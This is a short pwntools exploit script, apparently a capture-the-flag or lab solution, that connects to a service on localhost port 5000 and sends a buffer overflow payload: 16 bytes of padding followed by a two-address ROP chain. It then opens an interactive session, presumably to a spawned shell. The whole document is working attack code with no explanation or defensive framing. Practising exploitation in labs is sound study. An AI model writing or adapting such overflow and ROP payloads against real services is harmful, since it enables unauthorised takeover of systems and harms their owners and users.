from pwn import *

conn = remote("localhost", 5000)

rop = p64(0x401196)
rop += p64(0x4011a7)

conn.sendline(b'A'*0x10 + rop)
conn.interactive()
